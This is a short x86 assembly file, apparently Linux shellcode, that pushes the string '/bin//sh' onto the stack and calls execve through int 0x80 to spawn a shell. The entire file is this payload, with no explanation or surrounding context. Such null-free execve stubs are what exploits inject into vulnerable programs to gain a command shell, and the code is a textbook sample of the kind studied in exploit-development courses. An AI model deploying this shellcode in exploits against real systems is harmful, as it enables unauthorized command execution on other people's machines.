.section .data 
.section .text 
.globl _start


_start:
xor %eax,%eax
push %eax
push $0x68732f2f #hs// 
push $0x6e69622f #nib/ 
mov %esp,%ebx
xor %ecx,%ecx
xor %edx,%edx
mov $0xb,%al
int $0x80
